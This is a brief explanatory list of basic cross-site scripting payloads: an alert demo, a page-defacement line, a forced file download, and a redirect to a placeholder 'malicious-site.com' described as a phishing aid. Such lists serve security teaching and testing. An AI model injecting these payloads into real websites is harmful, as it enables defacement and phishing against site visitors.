Basic XSS Alert:
```
alert('XSS')
```
This payload triggers a JavaScript alert dialog with the message "XSS". It is commonly used to demonstrate the existence of an XSS vulnerability.


DOM Manipulation:
```
document.body.innerHTML = "<h1>Hacked</h1>";
```
```
var a = document.createElement('a');
a.href = 'data:text/plain;base64,VGhpcyBpcyBhIGZpbGUgZG93bmxvYWQgdGVzdCBmb3IgWFNTIHZ1bG5lcmFiaWxpdHku';
a.download = 'xss_test.txt';
document.body.appendChild(a);
a.click();
document.body.removeChild(a);
```
This payload modifies the entire content of the web page, replacing it with a custom message. This can be used for defacement attacks.


Redirect to Malicious Site:
```
window.location.href = 'http://malicious-site.com';
```
This payload redirects the user to a malicious website. This can be used for phishing attacks.


